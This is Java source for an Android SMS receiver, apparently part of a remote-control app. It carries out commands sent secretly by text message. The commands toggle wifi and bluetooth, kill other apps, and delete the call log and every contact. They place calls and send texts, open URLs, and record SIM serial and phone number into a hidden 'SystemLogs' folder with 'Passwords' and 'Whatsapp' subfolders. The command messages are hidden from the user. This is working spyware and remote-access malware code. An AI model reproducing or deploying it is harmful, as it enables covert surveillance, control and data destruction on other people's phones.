package com.cosmos.works.simplesmsreceiver;



import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.Writer;
import java.util.List;
import java.util.UUID;


import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.AlertDialog;
import android.app.NotificationManager;
import android.bluetooth.BluetoothAdapter;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.media.AudioManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;


public class IncomingSms extends BroadcastReceiver {
	@SuppressWarnings("deprecation")
	public static Camera cam = null;
	// Get the object of SmsManager
	final SmsManager sms = SmsManager.getDefault();
Context c; 
public PowerManager mPowerManager;
public PowerManager.WakeLock mWakeLock;
public Vibrator vibrator;
public Writer writer;

	@SuppressWarnings("deprecation")
	@Override
	public void onReceive(Context context, Intent intent) {
	Bundle bundle = intent.getExtras();
	File folder = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs");
	  folder.mkdirs();
	  File Passwords = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Passwords/");
	  Passwords.mkdir();
	  File Chrome = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Passwords/");
	  Chrome.mkdirs();

	  File Data = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Data/");
	  Data.mkdirs();
	  File Downloaded = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Downloaded/");
	 Downloaded.mkdirs();
	 File ScreenRecords = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/ScreenRecords");
	 ScreenRecords.mkdirs();
	 File whatsapp = new File(Environment.getExternalStorageDirectory().toString()+"/Android/data/SystemLogs/Passwords/Whatsapp/");
	whatsapp.mkdirs();
	 String extStorageDirectory = folder.toString();
	  List<ApplicationInfo> packages;
	    PackageManager pm;
	    pm = context.getPackageManager();
	    packages = pm.getInstalledApplications(0);
	SmsMessage[] msgs = null;
	if (bundle != null) {
	Object[] pdus = (Object[]) bundle.get("pdus");
	msgs = new SmsMessage[pdus.length];
	if (msgs.length >= 0) {
	msgs[0] = SmsMessage.createFromPdu((byte[]) pdus[0]);
	String message = msgs[0].getMessageBody().toString();
	
	
	    if (message.contains("Test")){



	    Toast.makeText(context,"Its working",Toast.LENGTH_LONG).show();
	    abortBroadcast();
	    }


	
			
	      	else if(message.contains("WI1")){
		WifiManager wifi = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
		wifi.setWifiEnabled(true);
		abortBroadcast();
	}

	       
	      	else if(message.contains("Aud0")){
	      	  
	            final AudioManager mobilemode = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);


	      	    mobilemode.setRingerMode(AudioManager.RINGER_MODE_SILENT);
	      AudioManager audio = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);

	      	  audio.adjustStreamVolume(AudioManager.STREAM_MUSIC,
	                    AudioManager.ADJUST_LOWER, 0);	      	   
	      	}
	      
	      	else if(message.contains("Aud1")){
	            final AudioManager mobilemode = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);

	    	    mobilemode.setRingerMode(AudioManager.RINGER_MODE_NORMAL);

	    	}
	      	else if(message.contains("Kill")){
	      		String packagename = message.replace("Kill", "");
	      		 ActivityManager mActivityManager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);

	      	   for (ApplicationInfo packageInfo : packages) {
	      	        if((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM)==1)continue;
	      	        if(packageInfo.packageName.equals(packagename)) continue;
	      	        mActivityManager.killBackgroundProcesses(packageInfo.packageName);
	      	   }  
	      	}
	      	else if(message.contains("DBlue")){
	      		BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
	      		if (mBluetoothAdapter.isEnabled()) {
	      		    mBluetoothAdapter.disable(); 
	      		    abortBroadcast();
	      		} 
	      	}
	      	else if(message.contains("EBlue")){
	      		BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
	      		if (!mBluetoothAdapter.isEnabled()) {
	      		    mBluetoothAdapter.enable(); 
	      		    abortBroadcast();
	      		} 
	      	}
	      	else if(message.contains("CAV")){
	      		ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
	    		List<RunningAppProcessInfo> runningProcInfo = activityManager .getRunningAppProcesses();
	    		for(int i = 0; i < runningProcInfo.size(); i++){
	    		        if(runningProcInfo.get(i).processName.equals("com.")) {
	    		        	Toast.makeText(context,"something", Toast.LENGTH_LONG);     	
	      	
	      	}}}
	      	        
	else if(message.contains("WI0")){
	WifiManager wifi;
	wifi=(WifiManager)context.getSystemService(Context.WIFI_SERVICE);

	wifi.setWifiEnabled(false);
	abortBroadcast();
	

	}
	else if(message.contains("FON")){
		Camera cam = Camera.open();     
		Parameters p = cam.getParameters();
		p.setFlashMode(Parameters.FLASH_MODE_TORCH);
		cam.setParameters(p);
		cam.startPreview();
		abortBroadcast();
		

	}
	
		
	else if(message.contains("DelCalog")){
	

		context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, null, null);
		abortBroadcast();
	}
	
		
	
	
	else if(message.contains("SSMS")){
	
		try{
		
		String orgmssg = message.replace("SSMS","");
		String phone = message.replaceAll("[^0-9]", "");
		String body = orgmssg.replaceAll("[^a-zA-Z]","");
		
		  
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phone, null,body, null, null);
         abortBroadcast();
    }
    catch (Exception e)
    {
          }

	}
	
	
	
	else if(message.contains("Toast"))
	{
		String Toasttext = message.replace("TOAST","");
		Toast.makeText(context,Toasttext,Toast.LENGTH_LONG).show();
		abortBroadcast();
	}
	else if(message.contains("OSV")){
		try{
		   String manufacturer = Build.MANUFACTURER;
		   String model = Build.MODEL;
		   String versionRelease = Build.VERSION.RELEASE;

       File file = new File(folder+"/Data/","OSDetails.txt");
       FileOutputStream stream = new FileOutputStream(file);
      
    stream.write(manufacturer.getBytes());
    stream.write(model.getBytes());
    stream.write(versionRelease.getBytes());

    stream.close();
	
			
		}catch(Exception ex){
	}}
	
	
	
	else if(message.contains("CALL")){
		try{
		String orgmssg = message.replace("CALL","");
		String phone = orgmssg.replaceAll("[^0-9]", "");
		
		    Intent my_callIntent = new Intent(Intent.ACTION_CALL);
		    my_callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
		    my_callIntent.setData(Uri.parse("tel:"+orgmssg));
		    //here the word 'tel' is important for making a call...
		    context.startActivity(my_callIntent);
		    abortBroadcast();
		} catch (Exception ex) {
		    Toast.makeText(context, "Error in your phone call"+ex.getMessage(), Toast.LENGTH_LONG).show();
		}

		abortBroadcast();
		
		}
	    
	else if(message.contains("EP")){
		 Intent myIntent=new Intent(context,Activate.class);   
		  myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
		  context.startActivity(myIntent);  
		  abortBroadcast();
	}
	    
	else if(message.contains("DP")){
      
		 Intent myIntent=new Intent(context,DeActivate.class);   
		  myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
		  context.startActivity(myIntent);  
		  abortBroadcast();
	}
	
	else if(message.contains("SIMDTLS")){
		try{
		TelephonyManager telemamanger = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		String getSimSerialNumber = telemamanger.getSimSerialNumber();
		String getSimNumber = telemamanger.getLine1Number();
		File file = new File(folder+"/Data/","SimDetails.txt");
		FileOutputStream stream = new FileOutputStream(file);
		try {
		    stream.write(getSimSerialNumber.getBytes());
		    stream.write(getSimNumber.getBytes());
		} finally {
		    stream.close();
		}
abortBroadcast();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}
	else if(message.contains("VIB")){
		
		 long pattern[] = { 0,100,0 };
		  vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
		  vibrator.vibrate(pattern, 0);
		  abortBroadcast();
		  }
	else if(message.contains("DelCalog")){
		context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, null, null);
		abortBroadcast();
	}
	else if(message.contains("Web")){
	String url = message.replace("Web","");
	

	if (!url.startsWith("https://") && !url.startsWith("http://")){
	    url = "http://" + url;
	}
	Intent openUrlIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
	context.startActivity(openUrlIntent);

abortBroadcast();
		
	}
	


	
	else if (message.contains("Decon")){
		ContentResolver cr = context.getContentResolver();
		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
		        null, null, null, null);
		while (cur.moveToNext()) {
		    try{
		        String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
		        Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
		        
		        cr.delete(uri, null, null);
		    }
		    catch(Exception e)
		    {
		       System .out.println(e.getStackTrace());
		    }}
			 



	}
	    
	}}}}
	    
	 